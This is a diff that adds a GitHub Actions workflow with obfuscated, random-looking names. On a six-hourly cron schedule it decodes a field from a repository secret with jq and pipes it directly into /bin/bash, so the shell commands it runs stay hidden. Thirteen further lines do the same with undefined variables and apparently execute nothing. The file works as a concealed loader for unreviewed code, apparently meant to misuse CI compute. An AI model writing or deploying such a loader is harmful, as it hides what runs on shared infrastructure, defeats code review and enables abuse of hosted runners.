@@ -1,0 +1,30 @@
+name: songjunnu2109
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songjunnu2109
+        env:
+          skjz95: ${{ secrets.skjz95 }}
+        run: |
+          echo $skjz95 | jq -r .hsqb75 | /bin/bash
+          echo $pddj9796 | jq -r .x0 | /bin/bash
+          echo $hku87 | jq -r .cus80 | /bin/bash
+          echo $qdfbg70 | jq -r .oarlk4 | /bin/bash
+          echo $hw2 | jq -r .a9 | /bin/bash
+          echo $tb7560 | jq -r .n6 | /bin/bash
+          echo $y46 | jq -r .w01 | /bin/bash
+          echo $dbf9968 | jq -r .c74978 | /bin/bash
+          echo $pknhm825 | jq -r .u3744 | /bin/bash
+          echo $wb950 | jq -r .bxdvw703 | /bin/bash
+          echo $l5 | jq -r .mkbnc33140 | /bin/bash
+          echo $g62582 | jq -r .z47 | /bin/bash
+          echo $lsz75 | jq -r .kzgq4 | /bin/bash
+          echo $o30348 | jq -r .yqdf138 | /bin/bash
+
